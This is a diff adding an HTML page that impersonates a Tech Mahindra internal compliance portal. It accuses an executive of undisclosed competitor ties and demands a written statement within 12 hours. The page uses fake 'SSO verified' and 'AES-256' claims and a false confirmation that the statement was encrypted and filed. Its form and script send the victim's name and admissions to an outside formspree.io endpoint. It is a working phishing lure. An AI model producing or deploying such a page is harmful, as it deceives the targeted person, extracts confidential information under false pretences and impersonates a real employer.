@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Internal Case Management Portal | Tech Mahindra</title>
+    <style>
+        :root { --brand-red: #E1261C; --brand-dark: #2B2F33; --bg-gray: #F4F6F8; --border: #D9D3CF; --beige: #EDE6E1; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: var(--bg-gray); color: var(--brand-dark); }
+        header { background: var(--beige); padding: 15px 40px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+        .main-container { max-width: 850px; margin: 30px auto; background: #fff; border-radius: 8px; border: 1px solid var(--border); box-shadow: 0 4px 10px rgba(0,0,0,0.05); overflow: hidden;}
+        .case-header { padding: 20px 40px; border-bottom: 1px solid var(--border); }
+        .badge { background: var(--brand-red); color: #fff; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; text-transform: uppercase; }
+        .content { padding: 30px 40px; }
+        .summary-box { background: #F7F4F2; border-left: 4px solid var(--brand-red); padding: 15px 20px; margin-bottom: 25px; font-size: 14px; line-height: 1.5; }
+        
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-weight: 700; font-size: 14px; margin-bottom: 8px; color: #2B2F33; }
+        input[type="text"], textarea { 
+            width: 100%; padding: 12px; border: 1px solid var(--border); border-radius: 4px; 
+            font-family: inherit; box-sizing: border-box; font-size: 14px; background: #FAFAFA;
+        }
+        input[type="text"]:focus, textarea:focus { outline: none; border-color: var(--brand-red); background: #fff; }
+        textarea { height: 120px; resize: vertical; }
+
+        .submit-btn { background: #5B0D1B; color: #fff; border: none; padding: 14px 40px; font-size: 15px; font-weight: bold; border-radius: 4px; cursor: pointer; float: right; margin-top: 10px; transition: 0.2s; }
+        .submit-btn:hover { background: var(--brand-red); }
+        .timer { color: var(--brand-red); font-size: 13px; font-weight: 700; margin-top: 25px; display: inline-block; }
+        #success-msg { display: none; text-align: center; padding: 60px 40px; }
+    </style>
+</head>
+<body>
+
+<header>
+    <img src="https://www.techmahindra.com/themes/custom/techm/logo.png" alt="Tech Mahindra" width="130">
+    <div style="font-size: 11px; font-weight: 600; text-align: right;">
+        SSO STATUS: <span style="color: #27ae60;">VERIFIED</span><br>
+        <span style="color: #7A7F86; font-weight: normal;">Session Encrypted (AES-256)</span>
+    </div>
+</header>
+
+<div class="main-container" id="mainContent">
+    <div class="case-header">
+        <span class="badge">Strictly Confidential</span>
+        <h1 style="font-size: 20px; margin: 10px 0 0 0;">Inquiry Statement Submission: ICMP-2025-092</h1>
+    </div>
+
+    <div class="content">
+        <div class="summary-box">
+            <strong>Case Overview:</strong> An independent compliance audit has identified potential undisclosed associations with external commercial entities that appear to conflict with Section 4.2 (Exclusivity & Fiduciary Duty) of your Executive Employment Covenant. Specifically, reports suggest professional advisory involvement with a competitor-aligned entity. This inquiry requires your formal clarification regarding these external affiliations.
+        </div>
+
+        <form id="complaintForm" action="https://formspree.io/f/xdanozbo" method="POST">
+            
+            <div class="form-group">
+                <label for="full_name">Respondent Full Name</label>
+                <input type="text" id="full_name" name="Respondent_Name" required placeholder="Enter your full legal name">
+            </div>
+
+            <div class="form-group">
+                <label for="detail_1">Detail Part 1: Response to Allegations</label>
+                <textarea id="detail_1" name="Response_to_Allegations" required placeholder="Describe the context of the activities mentioned in the notification..."></textarea>
+            </div>
+
+            <div class="form-group">
+                <label for="detail_2">Detail Part 2: Additional Disclosures</label>
+                <textarea id="detail_2" name="Additional_Disclosures" required placeholder="Provide any further information or conflict clearance details..."></textarea>
+            </div>
+            
+            <input type="hidden" name="_subject" value="URGENT: Formal Response - Case ICMP-2025-092">
+
+            <div style="overflow: auto; border-top: 1px solid #eee; padding-top: 10px;">
+                <span class="timer">COMPLIANCE DEADLINE: 12 HOURS</span>
+                <button type="submit" id="submitBtn" class="submit-btn">Log Formal Statement</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div class="main-container" id="success-msg">
+    <div style="color: #27ae60; font-size: 40px;">✓</div>
+    <h2 style="margin: 10px 0;">Statement Successfully Logged</h2>
+    <p style="color: #7A7F86; line-height: 1.5;">Your response has been encrypted and filed under Reference <strong>ICMP-2025-092-ACK</strong>.<br>The Compliance Team will review the submitted data shortly.</p>
+    <p style="font-size: 12px; margin-top: 30px; color: #bbb;">You may now safely exit the portal.</p>
+</div>
+
+<script>
+    const form = document.getElementById("complaintForm");
+    const mainBox = document.getElementById("mainContent");
+    const successBox = document.getElementById("success-msg");
+
+    form.onsubmit = async (e) => {
+        e.preventDefault();
+        const data = new FormData(form);
+        const submitBtn = document.getElementById('submitBtn');
+        
+        // Visual feedback for the executive
+        submitBtn.innerHTML = "Verifying & Sending...";
+        submitBtn.disabled = true;
+
+        fetch(form.action, {
+            method: 'POST',
+            body: data,
+            headers: { 'Accept': 'application/json' }
+        }).then(response => {
+            if (response.ok) {
+                mainBox.style.display = "none";
+                successBox.style.display = "block";
+                window.scrollTo(0,0);
+            } else {
+                alert("An error occurred during secure transmission. Please try again.");
+                submitBtn.innerHTML = "Log Formal Statement";
+                submitBtn.disabled = false;
+            }
+        });
+    };
+</script>
+
+</body>
+</html>
